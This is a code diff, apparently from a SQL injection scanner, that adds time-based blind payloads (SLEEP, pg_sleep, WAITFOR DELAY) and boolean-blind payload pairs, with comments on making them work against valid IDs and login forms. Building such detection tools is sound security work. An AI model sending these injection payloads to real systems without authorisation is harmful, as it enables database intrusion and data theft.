@@ -21,9 +21,17 @@ ERROR_SIGNATURES = [
 ]
 
 TIME_PAYLOADS = [
+    # String context with valid base ID: user_id='1' AND SLEEP(3)-- → exactly 1 row → 3 s
+    # Preferred over bare ' variants — AND short-circuits on empty match, OR runs for every row
+    "1' AND SLEEP(3)-- ",
+    "1' AND SLEEP(3)#",
+    "1' AND pg_sleep(3)-- ",
+    "1'; WAITFOR DELAY '0:0:3'-- ",
+    # Bare-quote variants (numeric context or OR-based login forms)
     "' AND SLEEP(3)-- ",
     "' AND SLEEP(3)#",
-    "' OR SLEEP(3)-- ",       # login form: WHERE user='X' OR SLEEP(3)-- '
+    "' OR SLEEP(3) AND '1'='1",   # OR that limits to 1 match via AND in same expr
+    "' OR SLEEP(3)-- ",
     "' OR SLEEP(3)#",
     "' AND pg_sleep(3)-- ",
     "'; WAITFOR DELAY '0:0:3'-- ",
@@ -36,10 +44,14 @@ TIME_PAYLOADS = [
 # (true_condition, false_condition) pairs for boolean-blind detection.
 # If the server returns different responses for these, SQL is evaluated server-side.
 BOOLEAN_PAIRS = [
-    ("' AND '1'='1'-- ", "' AND '1'='2'-- "),   # string context, MySQL/MSSQL
-    ("' AND 1=1-- ", "' AND 1=2-- "),             # alt syntax
-    ("1 AND 1=1-- ", "1 AND 1=2-- "),             # numeric param
-    ("' OR '1'='1'-- ", "' OR '1'='2'-- "),      # login form (WHERE user=X OR ...)
+    # Valid base ID: user_id='1' exists → true/false gives different row counts
+    ("1' AND '1'='1'-- ", "1' AND '1'='2'-- "),  # string context, valid base
+    ("1' AND 1=1-- ", "1' AND 1=2-- "),            # string context, numeric condition
+    # Bare-quote fallback
+    ("' AND '1'='1'-- ", "' AND '1'='2'-- "),     # string context, MySQL/MSSQL
+    ("' AND 1=1-- ", "' AND 1=2-- "),              # alt syntax
+    ("1 AND 1=1-- ", "1 AND 1=2-- "),              # numeric param
+    ("' OR '1'='1'-- ", "' OR '1'='2'-- "),       # login form (WHERE user=X OR ...)
 ]
 
 ERROR_PAYLOADS = [
